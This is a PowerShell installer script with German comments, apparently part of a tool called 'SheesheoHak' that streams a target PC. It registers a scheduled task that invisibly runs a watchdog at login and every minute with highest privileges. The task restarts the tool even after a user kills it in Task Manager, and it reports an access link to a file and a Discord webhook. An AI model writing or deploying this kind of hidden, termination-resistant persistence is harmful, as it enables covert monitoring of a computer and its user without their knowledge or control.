# Einmalige Einrichtung auf dem Ziel-PC. ALS ADMINISTRATOR ausfuehren.
# Legt einen geplanten Task an, der beim Login UND jede Minute prueft, ob der Watchdog laeuft,
# und ihn sonst (unsichtbar) startet. Dadurch kommt alles von selbst zurueck, auch wenn man es
# im Task-Manager beendet. Bewusst stoppen: uninstall.ps1 (Admin).

$ErrorActionPreference = 'Stop'
$Dir = Split-Path -Parent $MyInvocation.MyCommand.Path
$vbs = Join-Path $Dir 'ensure.vbs'
if (-not (Test-Path $vbs)) { throw "ensure.vbs nicht gefunden in $Dir" }

$action    = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument ('"' + $vbs + '"') -WorkingDirectory $Dir
# Beim Login + sofort und danach jede Minute wiederholen (unbegrenzt)
$tLogon    = New-ScheduledTaskTrigger -AtLogOn
$tRepeat   = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration (New-TimeSpan -Days 3650)
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
                -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
                -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew

# alten Task-Namen (falls aus früherer Version vorhanden) entfernen
Unregister-ScheduledTask -TaskName 'StreamFun' -Confirm:$false -ErrorAction SilentlyContinue

Register-ScheduledTask -TaskName 'SheesheoHak' -Action $action -Trigger @($tLogon, $tRepeat) `
    -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName 'SheesheoHak'

Write-Host "SheesheoHak installiert und gestartet."
Write-Host "Der aktuelle Link steht nach ein paar Sekunden in link.txt (und im Discord-Webhook, falls gesetzt)."
